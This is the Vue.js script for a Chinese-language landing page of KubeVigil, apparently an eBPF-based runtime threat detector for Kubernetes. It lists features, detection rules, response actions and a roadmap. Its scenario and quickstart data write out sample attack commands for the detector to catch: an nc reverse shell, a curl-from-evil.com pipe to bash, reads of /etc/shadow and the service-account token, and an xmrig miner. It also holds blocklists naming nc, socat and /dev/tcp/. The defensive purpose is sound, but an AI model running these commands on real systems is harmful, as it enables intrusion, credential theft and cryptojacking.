const { createApp, ref, onMounted, onUnmounted } = Vue

createApp({
  setup() {
    const scrolled = ref(false)
    const menuOpen = ref(false)
    const currentSection = ref('hero')

    const navItems = [
      { id: 'why', label: '为什么' },
      { id: 'features', label: '功能' },
      { id: 'architecture', label: '架构' },
      { id: 'scenarios', label: '场景' },
      { id: 'quickstart', label: '快速开始' },
      { id: 'rules', label: '规则' },
      { id: 'response', label: '响应' },
      { id: 'roadmap', label: '路线图' },
    ]

    const comparisons = [
      { traditional: '检查镜像中已知漏洞（CVE）', kubevigil: '捕获运行时的未知攻击（0day）' },
      { traditional: '检查 YAML 配置是否规范', kubevigil: '监控实际系统调用行为' },
      { traditional: '无法发现 0day 漏洞利用', kubevigil: '内核态视角，攻击者无法绕过' },
      { traditional: '无法发现无文件攻击、内存马', kubevigil: '捕获反弹 Shell、脚本注入' },
      { traditional: '事后审计，攻击已造成损失', kubevigil: '实时检测 + 自动响应，秒级阻断' },
      { traditional: '需要修改应用代码或注入 Sidecar', kubevigil: '零侵入，以 DaemonSet 独立运行' },
      { traditional: '规则硬编码，更新需重新部署', kubevigil: 'YAML 规则热重载，SIGHUP 即生效' },
    ]

    const features = [
      {
        icon: '🔍',
        title: '进程执行监控 (execve)',
        desc: '捕获容器内所有新启动的进程，含父进程追踪（PPID），检测反弹 Shell、挖矿程序等',
        items: ['黑名单进程匹配 (nc/xmrig/socat)', '可疑参数检测 (/dev/tcp/)', '父进程血缘追踪 (PPID)', '白名单排除 (kubevigil/kubelet)']
      },
      {
        icon: '📁',
        title: '文件访问监控 (openat)',
        desc: '监控对敏感文件的非授权读取，如 /etc/shadow、K8s Service Account Token',
        items: ['敏感路径监控 (/etc/shadow)', 'K8s Secret 访问检测', 'SSH 密钥读取监控', '系统进程白名单排除']
      },
      {
        icon: '🌐',
        title: '网络连接监控 (connect)',
        desc: '捕获恶意的外连请求，自动处理网络字节序，检测 C2 通信',
        items: ['端口黑名单 (4444/1337/31337)', 'CIDR 网段过滤', '网络字节序自动转换', 'C2 服务器通信检测']
      },
      {
        icon: '⚡',
        title: 'YAML 规则引擎',
        desc: '声明式规则定义，支持热重载，线程安全，无需重启即可更新检测策略',
        items: ['YAML 声明式规则定义', 'SIGHUP 热重载', '读写锁线程安全', 'CIDR 预编译优化']
      },
      {
        icon: '🔗',
        title: 'K8s 原生上下文',
        desc: '自动将内核态 PID 映射到 K8s Pod/Namespace，告警自带完整容器上下文',
        items: ['PID → Pod 自动映射', 'cgroup v1/v2 双支持', 'containerd/Docker 运行时兼容', 'FNV-1a 哈希容器 ID']
      },
      {
        icon: '🛡️',
        title: '自动响应与加固',
        desc: '检测到威胁后自动执行隔离、终止、网络阻断等响应策略',
        items: ['Label 隔离 (NetworkPolicy)', 'Kill Pod (立即终止)', 'NetworkPolicy 网络阻断', 'livenessProbe 健康检查']
      },
    ]

    const scenarios = [
      { title: '反弹 Shell', attack: 'nc -e /bin/bash 10.0.0.1 4444', detect: 'execve 黑名单进程', action: 'Kill Pod', severity: 'critical', severityLabel: 'CRITICAL' },
      { title: '挖矿程序', attack: 'xmrig -o pool.mine.xyz:3333', detect: 'execve 进程匹配', action: 'Kill Pod', severity: 'critical', severityLabel: 'CRITICAL' },
      { title: '可疑下载执行', attack: 'curl http://evil.com/shell.sh | bash', detect: 'execve 参数匹配', action: 'Label 隔离', severity: 'high', severityLabel: 'HIGH' },
      { title: '敏感文件访问', attack: 'cat /etc/shadow', detect: 'openat 路径监控', action: 'Label 隔离', severity: 'high', severityLabel: 'HIGH' },
      { title: 'C2 通信', attack: 'connect → 203.0.113.50:4444', detect: 'connect CIDR+端口', action: 'NetworkPolicy', severity: 'critical', severityLabel: 'CRITICAL' },
      { title: 'K8s Secret 窃取', attack: 'cat /var/run/secrets/kubernetes.io/.../token', detect: 'openat 路径监控', action: 'Label 隔离', severity: 'high', severityLabel: 'HIGH' },
    ]

    const steps = [
      { title: 'Helm 一键部署', code: 'git clone https://github.com/shuhuNB515/KubeVigil.git\ncd KubeVigil\nhelm install kubevigil ./charts/kubevigil \\\n  --namespace kubevigil \\\n  --create-namespace', note: 'KubeVigil 会以 DaemonSet 方式在每个节点部署一个 Agent' },
      { title: '验证运行状态', code: 'kubectl get pods -n kubevigil\nkubectl logs -n kubevigil -l app.kubernetes.io/name=kubevigil -f', note: '确认每个节点一个 Pod，状态为 Running，日志显示 eBPF 探针已加载' },
      { title: '模拟攻击测试', code: 'kubectl apply -f examples/test-pod.yaml\nkubectl exec -it kubevigil-test -- sh\n# 在测试 Pod 内执行\nnc -e /bin/bash 10.0.0.1 4444', note: 'KubeVigil 应立即检测到反弹 Shell 并输出告警' },
    ]

    const builtInRules = [
      { name: 'reverse-shell-detected', type: 'execve', severity: 'critical', action: 'Kill Pod', desc: '检测 nc/socat + /dev/tcp/ 参数' },
      { name: 'crypto-mining', type: 'execve', severity: 'critical', action: 'Kill Pod', desc: '检测 xmrig/minerd 等挖矿程序' },
      { name: 'suspicious-download', type: 'execve', severity: 'high', action: 'Label', desc: '检测 curl|bash 等管道命令' },
      { name: 'sensitive-file-access', type: 'open', severity: 'high', action: 'Label', desc: '检测 /etc/shadow、K8s Secret 访问' },
      { name: 'c2-communication', type: 'connect', severity: 'critical', action: 'NetworkPolicy', desc: '检测与已知 C2 服务器的通信' },
    ]

    const customRuleExample = `rules:
  - name: no-python-in-nginx
    description: "禁止在 nginx 容器中执行 python"
    severity: high
    action: kill_pod
    execve:
      blockedProcesses:
        - python
        - python3
        - pip

  - name: block-malicious-ip
    description: "阻断到已知恶意 IP 的连接"
    severity: critical
    action: network_policy
    connect:
      blockedCIDRs:
        - "203.0.113.0/24"
      blockedPorts:
        - 4444
        - 1337`

    const responseActions = [
      { icon: '📢', name: 'alert', desc: '仅输出告警日志，不执行任何操作', useCase: '观察模式、调试' },
      { icon: '🏷️', name: 'label', desc: '给 Pod 打上 kubevigil.io/isolated=true 标签', useCase: '中等风险，配合 NetworkPolicy 隔离' },
      { icon: '💀', name: 'kill_pod', desc: '立即删除 Pod（gracePeriod=0）', useCase: '高危威胁，如挖矿、反弹 Shell' },
      { icon: '🚫', name: 'network_policy', desc: '打标签 + 触发 NetworkPolicy 阻断流量', useCase: 'C2 通信、数据外泄' },
    ]

    const roadmap = [
      { title: 'MVP — eBPF 探针 + execve 监控', desc: '基础探针与实时告警', done: true },
      { title: '规则化 — YAML 规则引擎', desc: '声明式规则 + 黑白名单', done: true },
      { title: '自动响应 — K8s API 集成', desc: '隔离/终止/网络阻断', done: true },
      { title: '部署 — Dockerfile + Helm Chart', desc: '生产级部署方案', done: true },
      { title: '加固 — 热重载 + 线程安全 + 健康检查', desc: '运维能力完善', done: true },
      { title: 'Web Dashboard — 轻量级 Web 界面', desc: '告警展示与统计', done: false, current: true },
      { title: '威胁情报集成', desc: '接入外部威胁情报源', done: false },
      { title: 'eBPF Map 状态追踪', desc: '进程血缘关系追踪', done: false },
      { title: 'Prometheus 指标', desc: '安全指标导出与告警', done: false },
    ]

    function scrollTo(id) {
      const el = document.getElementById(id)
      if (el) el.scrollIntoView({ behavior: 'smooth' })
    }

    function copyCode(text) {
      navigator.clipboard.writeText(text).then(() => {
        // Simple feedback
      }).catch(() => {})
    }

    function onScroll() {
      scrolled.value = window.scrollY > 50

      // Update current section
      const sections = navItems.map(n => n.id)
      for (let i = sections.length - 1; i >= 0; i--) {
        const el = document.getElementById(sections[i])
        if (el && el.getBoundingClientRect().top <= 200) {
          currentSection.value = sections[i]
          break
        }
      }
    }

    onMounted(() => {
      window.addEventListener('scroll', onScroll, { passive: true })
      // Highlight code blocks
      document.querySelectorAll('pre code').forEach(block => {
        hljs.highlightElement(block)
      })
    })

    onUnmounted(() => {
      window.removeEventListener('scroll', onScroll)
    })

    return {
      scrolled, menuOpen, currentSection,
      navItems, comparisons, features, scenarios, steps,
      builtInRules, customRuleExample, responseActions, roadmap,
      scrollTo, copyCode,
    }
  }
}).mount('#app')
